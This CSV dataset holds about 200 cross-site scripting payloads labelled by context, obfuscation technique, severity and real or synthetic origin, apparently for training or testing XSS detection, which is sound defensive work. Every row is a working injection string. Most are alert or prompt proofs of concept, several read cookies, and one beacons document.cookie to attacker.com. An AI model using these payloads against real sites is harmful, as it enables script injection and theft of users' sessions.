payload,context,technique,severity,length,source
"<param oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</param>",tag_injection,none,medium,73,real
"%3Cselect
onpointermove=prompt('XSS')%3E",tag_injection,synthetic,medium,40,synthetic
""" %3E%3Csvg onwebkitfullscreenchange=alert('XSS')%3E",attribute_escape,synthetic,medium,52,synthetic
OnpLayIng=coNsoLe.Log&#40;lOcaTioN.hAsh&#41;,event_handler,synthetic,low,44,synthetic
"<IMG SRC=x onstorage=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,60,real
 onanimationend=alert(1),event_handler,synthetic,medium,24,synthetic
onauxclick=prompt('XSS'),event_handler,synthetic,medium,24,synthetic
' ><svg onp&#97;g&#101;show=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,61,synthetic
<a/href=&#74;ava%0a%0d%09script&colon;alert()>click,generic,html_entity|url_encoding,medium,51,real
<small onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
""" ondr&#97;g&#101;nt&#101;r=confirm('XSS') """,attribute_escape,synthetic,medium,44,synthetic
"<font draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</font>",tag_injection,none,medium,66,real
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",js_uri,comment_injection|case_variation,medium,56,real
"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
ongotpointercapture=prompt/**/(location.hash),event_handler,synthetic,low,45,synthetic
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",tag_injection,none,medium,113,real
\' OntOucHmoVe=ProMpt('XSS')//,attribute_escape,synthetic,medium,30,synthetic
' onscrollend=prompt(location.hash) ',attribute_escape,synthetic,medium,37,synthetic
onlo&#97;d=j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,72,synthetic
<pl&#97;int&#101;xt onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,low,95,synthetic
"<object draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</object>",tag_injection,none,medium,70,real
"'><img src=x onb&#101;for&#101;p&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,93,synthetic
<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,tag_injection,none,medium,82,real
"""/>""/><img src=xss onerror=alert(2)>",tag_injection,none,medium,36,real
\' onanimationend=confirm(document.domain)//,attribute_escape,synthetic,medium,44,synthetic
<&#97;nim&#97;t&#101;motion ong&#101;stur&#101;st&#97;rt=confirm(1) ong&#101;stur&#101;st&#97;rt=confirm(1)>,tag_injection,synthetic,medium,108,synthetic
<titl&#101; onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS')/>,tag_injection,synthetic,medium,68,synthetic
"\"" onmous&#101;down=consol&#101;.log('XSS')//",attribute_escape,synthetic,low,45,synthetic
"setTimeout(""confirm(btoa(document.cookie))"",0)",dom_sink,synthetic,high,46,synthetic
`><img src=x onend=prompt(location.hash)>,attribute_escape,synthetic,medium,41,synthetic
"' %3E%3Csvg oncut=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,58,synthetic
<li contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,56,real
"%3Cxmp x=y onfocusout=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,62,synthetic
 onStaLleD=cOnfIrm(loCatIon.haSh),event_handler,synthetic,medium,33,synthetic
"<style>@keyframes x{}</style><input style=""animation-name:x"" onwebkitanimationend=""alert(1)""></input>",tag_injection,none,medium,101,real
%27 onpagereveal=confirm(document.domain) %27,attribute_escape,synthetic,medium,45,synthetic
"<figcaption onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</figcaption>",tag_injection,none,medium,78,real
\%22 onpagereveal=confirm(document.domain)//,attribute_escape,synthetic,medium,44,synthetic
%3C%= confirm(1) %%3E,template_injection,synthetic,medium,21,synthetic
<track onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
&quot; onbeforeinput=console.log(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,52,synthetic
""" %3E%3Csvg ondblclick=console.log(location.hash)%3E",attribute_escape,synthetic,medium,52,synthetic
__proto__[%22onfocusout%22]=prompt(1),dom_sink,synthetic,medium,37,synthetic
"<style>:target {color:red;}</style><style id=x style=""transition:color 1s"" ontransitionstart=alert(1)></style>",tag_injection,none,medium,110,real
"\' on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,medium,65,synthetic
<a	onsearch=alert(1)>,tag_injection,synthetic,medium,21,synthetic
"<rp onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</rp>",tag_injection,none,medium,57,real
\' ontouchmov&#101;=prompt(1)//,attribute_escape,synthetic,medium,31,synthetic
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dfn>",tag_injection,none,medium,97,real
"document.body.innerHTML=""<img src=x onerror=console.log(document.cookie+'&loc='+location.href)>""",dom_sink,synthetic,high,96,synthetic
"<div draggable=""true"" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable style=display:block>drop here</iframe>",tag_injection,none,medium,133,real
'><Img srC=x onAniMatIonIteRatIon=coNsoLe.Log(doCumEnt.doMaiN)>,attribute_escape,synthetic,medium,63,synthetic
' ><svg ondblclick=confirm(1)>,attribute_escape,synthetic,medium,30,synthetic
' ongotpoint&#101;rc&#97;ptur&#101;=prompt('XSS') ',attribute_escape,synthetic,medium,51,synthetic
"<script>&#97;l&#101;rt`String.fromCh&#97;rCod&#101;(88,83,83)`</script>",script_injection,synthetic,low,71,synthetic
%22 onpopstate=alert(location.hash) %22,attribute_escape,synthetic,medium,39,synthetic
"<br onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</br>",tag_injection,none,medium,63,real
"<legend draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</legend>",tag_injection,none,medium,70,real
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></tfoot>",tag_injection,none,medium,103,real
' ><svg on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,52,synthetic
"location=""javascr	ipt:console.log('XSS')""",dom_sink,synthetic,high,41,synthetic
"""%3E%3Cimg src=x onmousewheel=alert(document.domain)%3E",attribute_escape,synthetic,medium,55,synthetic
"<b draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</b>",tag_injection,none,medium,80,real
<track onpointerout=alert(1) style=display:block>AnonKryptiQuz</track>,tag_injection,none,medium,70,real
"oncontextmenu=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,51,synthetic
"\"" onended=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,51,synthetic
<b <script>alert(1)</script>0,script_injection,none,medium,29,real
"<img src=x onerror=\x11""javascript:alert(1156)"">",js_uri,none,medium,48,real
<s&#101;t onc&#97;npl&#97;y=confirm(1)/>,tag_injection,synthetic,medium,40,synthetic
<seT oNfoCus=prOmpT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,37,synthetic
<base/onpointerup=alert(location.hash)>,tag_injection,synthetic,medium,39,synthetic
"[color=red' onmouseover=""alert('xss')""]mouse over[/color]",attribute_escape,none,medium,57,real
"<noScrIpt onBefOreMatCh=ConFirM(STriNg.FroMChArCOde(88,83,83)) OnbEfoRemAtcH=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,116,synthetic
"<noframes onclick=""alert(1)"" style=display:block>AnonKryptiQuz</noframes>",tag_injection,none,medium,73,real
"<STYLE>li {list-style-image: url(""javascript:javascript:alert(6422)"");}</STYLE><UL><LI>XSS",js_uri,case_variation,medium,90,real
"<script>Function(%27confirm(String.fromCharCode(88,83,83))%27)();</script>",script_injection,synthetic,high,74,synthetic
"<!--><Xmp onFocUsoUt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,59,synthetic
<img/src/onerror=prompt(8)>,tag_injection,none,medium,27,real
{{$on.constructor('prompt(document.cookie)')()}},template_injection,synthetic,high,48,synthetic
"%22><img src=x ontouchstart=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
`><img src=x onmous&#101;down=consol&#101;.log('XSS')>,attribute_escape,synthetic,low,54,synthetic
"""%3E%3Cimg src=x oninvalid=confirm(1)%3E",attribute_escape,synthetic,medium,40,synthetic
"<nextid onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</nextid>",tag_injection,none,medium,70,real
"<style>@keyframes slidein {}</style><meta style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></meta>",tag_injection,none,medium,168,real
onblur=console.log&#40;1&#41;,event_handler,synthetic,low,29,synthetic
"loc&#97;tion=""j&#97;v&#97;script:&#101;v&#97;l(1)""",dom_sink,synthetic,low,50,synthetic
<mtExt	onFocUsoUt=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
<button popovertarget=x>Click me</button><nobr ontoggle=alert(1) popover id=x>AnonKryptiQuz</nobr>,tag_injection,none,medium,98,real
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""XMLHttpR&#101;qu&#101;st(loc&#97;tion.h&#97;sh)"")",dom_sink,synthetic,high,106,synthetic
<!--><MatH oNdrAgoVer=prOmpT(1)>,tag_injection,synthetic,medium,32,synthetic
"""><img src=x onp&#97;g&#101;hid&#101;=prompt('XSS')>",attribute_escape,synthetic,medium,52,synthetic
%3C!--%3E%3Cmeta ondrop=alert(document.domain)%3E,tag_injection,synthetic,medium,49,synthetic
"""><img src=x onbeforepaste=prompt(1)>",attribute_escape,synthetic,medium,37,synthetic
' ><svg onw&#97;iting=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,55,synthetic
"<image style='filter:url(""data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>"")'>",script_injection,url_encoding,high,133,real
<xss x=y onk&#101;ypr&#101;ss=consol&#101;.log(1)>,tag_injection,synthetic,low,50,synthetic
"<thead id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></thead>",tag_injection,none,medium,86,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style=""position:absolute;"" onanimationcancel=""print()""></menuitem>",tag_injection,none,low,185,real
OnwAitIng=coNsoLe.Log/**/(lOcaTioN.hAsh),event_handler,synthetic,low,40,synthetic
<isindex type=image onload=alert(1) src=validimage.png>,tag_injection,none,medium,55,real
""" oNwaItiNg=ConFirM(dOcuMenT.dOmaIn) """,attribute_escape,synthetic,medium,38,synthetic
<b onpointerdown=alert(1) style=display:block>AnonKryptiQuz</b>,tag_injection,none,medium,63,real
""" ondblclick=\u0061lert(1) """,attribute_escape,synthetic,low,28,synthetic
ontransitionend=alert(location.hash),event_handler,synthetic,medium,36,synthetic
JavAscRipT:pRomPt/**/(1),js_uri,synthetic,low,24,synthetic
' ><svg ondr&#97;gst&#97;rt=confirm(1)>,attribute_escape,synthetic,medium,39,synthetic
"WinDow[""cOnsOle.loG""](btOa(DocUmeNt.CooKie))",dom_sink,synthetic,high,44,synthetic
"<shadow oncontextmenu=""alert(1)"">AnonKryptiQuz</shadow>",tag_injection,none,medium,55,real
"javascript:console.log/***/(String.fromCharCode(88,83,83))",js_uri,synthetic,high,58,synthetic
<meta onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</meta>,tag_injection,none,medium,74,real
"' on&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,62,synthetic
<scr	ipt>/*/confirm(1)</scr	ipt>,script_injection,synthetic,medium,32,synthetic
onpoint&#101;rup=prompt/*x*/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,51,synthetic
"""><svg onload=""confirm(7)"">",tag_injection,none,medium,27,real
""" ><svg onscrollsn&#97;pch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,87,synthetic
onpageshow=javascript:\u0061lert('XSS'),event_handler,synthetic,low,39,synthetic
%22 ><svg onplay=confirm(document.domain)>,attribute_escape,synthetic,medium,42,synthetic
<em onfocusout=alert(1) tabindex=1 id=x></em><input autofocus>,tag_injection,none,medium,62,real
\' oninvalid=prompt(1)//,attribute_escape,synthetic,medium,24,synthetic
<!--><video onmozfullscreenchange=prompt('XSS')>,tag_injection,synthetic,medium,48,synthetic
eval(%22fetch(location.hash)%22),dom_sink,synthetic,high,32,synthetic
onpoint&#101;rdown=prompt(1),event_handler,synthetic,medium,28,synthetic
&quot; oninvalid=prompt(1) x=&quot;,attribute_escape,synthetic,medium,35,synthetic
"<ins onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</ins>",tag_injection,none,medium,59,real
"<style>:target {transform: rotate(180deg);}</style><input id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></input>",tag_injection,none,medium,128,real
"%3Cxmp	ontouchend=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,63,synthetic
"\%27 onanimationcancel=console.log(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,67,synthetic
%3Cobject onwebkitanimationend=alert(location.hash)/%3E,tag_injection,synthetic,medium,55,synthetic
eval(%22prompt(document.cookie)%22),dom_sink,synthetic,high,35,synthetic
%27 onscrollend=prompt(location.hash) %27,attribute_escape,synthetic,medium,41,synthetic
"""><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>",dom_sink,html_entity|whitespace_obfuscation,low,86,real
""" ><svg ontouch&#101;nd=consol&#101;.log(1)>",attribute_escape,synthetic,low,44,synthetic
<font onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66,real
"%22><img src=x onanimationend=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,69,synthetic
"java
script:confirm(1)",js_uri,synthetic,medium,22,synthetic
	onmouseover=confirm(1),event_handler,synthetic,medium,23,synthetic
#confirm(1),template_injection,synthetic,medium,11,synthetic
"<output oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,100,real
"<ol onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</ol>",tag_injection,none,medium,79,real
' oNkeYdoWn=AleRt('XSS') ',attribute_escape,synthetic,medium,26,synthetic
"<script
>console.log(location.hash)</script>",script_injection,synthetic,medium,44,synthetic
OnmOusEovEr=ConSolE.lOg&#40;1&#41;,event_handler,synthetic,low,34,synthetic
"\"" onpaste=confirm('XSS')//",attribute_escape,synthetic,medium,27,synthetic
"<dt draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</dt>",tag_injection,none,medium,62,real
%3C!--%3E%3Cmath ondragover=prompt(1)%3E,tag_injection,synthetic,medium,40,synthetic
"<script>s&#101;tTim&#101;out('prompt(loc&#97;tion.h&#97;sh)',0)</script>",script_injection,synthetic,medium,72,synthetic
' ><svg onvolumechange=alert('XSS')>,attribute_escape,synthetic,medium,36,synthetic
"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></h1>",tag_injection,none,medium,108,real
"<style>:target {color: red;}</style><font id=x style=""transition:color 10s"" ontransitioncancel=print()></font>",tag_injection,none,low,110,real
<script	>prompt('XSS')</script>,script_injection,synthetic,medium,31,synthetic
""" oNfoCus=coNfiRm(DocUmeNt.DomAin) aUtoFocUs=""",attribute_escape,synthetic,medium,46,synthetic
%3Ctable/oninvalid=prompt('XSS')%3E,tag_injection,synthetic,medium,35,synthetic
' onpagehide=\u0061lert(location.hash) ',attribute_escape,synthetic,low,40,synthetic
<textarea src=x onscrollend=alert('XSS')>,tag_injection,synthetic,medium,41,synthetic
\' onpointercancel=prompt(1)//,attribute_escape,synthetic,medium,30,synthetic
"<rtc draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",tag_injection,none,medium,84,real
"<p draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</p>",tag_injection,none,medium,78,real
onanimationend=console.log&#40;%27XSS%27&#41;,event_handler,synthetic,low,45,synthetic
"__proto__[%22onanimationcancel%22]=fetch(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink,synthetic,high,100,synthetic
oninput=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,37,synthetic
<area onpointerenter=alert(1) style=display:block>AnonKryptiQuz</area>,tag_injection,none,medium,70,real
""" ontransitionend=confirm('XSS') """,attribute_escape,synthetic,medium,34,synthetic
"\' ontr&#97;nsitionrun=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,79,synthetic
 oninput=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,38,synthetic
"<figure id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></figure>",tag_injection,none,medium,88,real
%27 ontouchmove=prompt(1) %27,attribute_escape,synthetic,medium,29,synthetic
'><img src=x oninput=\u0061lert(document.domain)>,attribute_escape,synthetic,low,49,synthetic
%3Cobject src=x onanimationcancel=alert(document.domain)%3E,tag_injection,synthetic,medium,59,synthetic
"onp&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,63,synthetic
"' oncut=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,low,66,synthetic
""" ><svG oNbeForEtoGglE=cOnsOle.loG('XSS')>",attribute_escape,synthetic,medium,42,synthetic
"""><ScrIpt>prOmpT('XSS')</scRipT>",script_injection,synthetic,medium,32,synthetic
<anImaTetRanSfoRm OncOntExtMenU=pRomPt(DocUmeNt.DomAin) oNcoNteXtmEnu=prOmpT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,94,synthetic
<td x=Y oNmoZfuLlsCreEncHanGe=ConSolE.lOg(LocAtiOn.HasH)>,tag_injection,synthetic,medium,57,synthetic
"\' OncAnpLay=coNfiRm(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
"<rb onmouseleave=""alert(1)"">AnonKryptiQuz</rb>",tag_injection,none,medium,46,real
"Obj&#101;ct.&#97;ssign(window,{""onblur"":f&#101;tch})",dom_sink,synthetic,low,52,synthetic
<scr	ipt>console.log(document.domain)</scr	ipt>,script_injection,synthetic,medium,47,synthetic
"<video draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</video>",tag_injection,none,medium,68,real
&quOt; onTraNsiTioNenD=pRomPt(LocAtiOn.HasH) X=&QuoT;,attribute_escape,synthetic,medium,53,synthetic
"<caption onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</caption>",tag_injection,none,medium,67,real
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",tag_injection,none,medium,162,real
%3Clink oninput=alert(document.domain)%3E,tag_injection,synthetic,medium,41,synthetic
"<tr src=x ontr&#97;nsition&#101;nd=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,82,synthetic
"<caption onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</caption>",tag_injection,none,medium,73,real
"<u onmouseup=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,41,real
